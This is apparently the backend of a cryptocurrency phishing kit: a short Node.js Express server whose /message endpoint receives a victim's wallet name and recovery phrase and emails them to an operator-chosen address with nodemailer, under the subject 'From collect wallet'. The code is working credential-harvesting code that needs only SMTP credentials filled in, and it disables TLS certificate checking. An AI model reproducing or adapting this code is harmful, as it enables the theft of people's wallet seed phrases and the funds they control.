const express = require( 'express' );
const app = express();
const PORT = process.env.PORT || 2000;
const path = require( 'path' );
var nodemailer = require("nodemailer");

app.use(express.json())

app.post('/message', (req,res)=>{
//    console.log(req)
    const input = `
    <p> You have a messgae</p>
    <h3> Contact Details</h3>
    <ul>
    <li>Wallet: ${req.body.wallet}</li>
    <li>Recovery Phrase: ${req.body.rPhrase}</li>
    </ul>
    `;
    var transporter = nodemailer.createTransport( {
        service: "",//Gmail or any mail server
        host:"",//Gmail or any mail server
        port:587,
        secure: false,
        auth: {
          user: '',//email
          pass: ''//password
        },
        tls:{
            rejectUnauthorized: false
        }
        
    } );
    
    var mailOptions = {
        from: "'Any thing'  <email same as user>",
        to: 'the email you want to send the message to',
        subject: 'From collect wallet',
        html: input
    };
    
    
    transporter.sendMail( mailOptions, ( err, info ) => {
    if ( err ) {
    res.json({status: 500})
    console.log(err)
    } else {
    res.json(info.data)
    // console.l
    }
    } )
    
    
        
})

app.listen( PORT, () => console.log( `Server started on Port ${ PORT }` ) );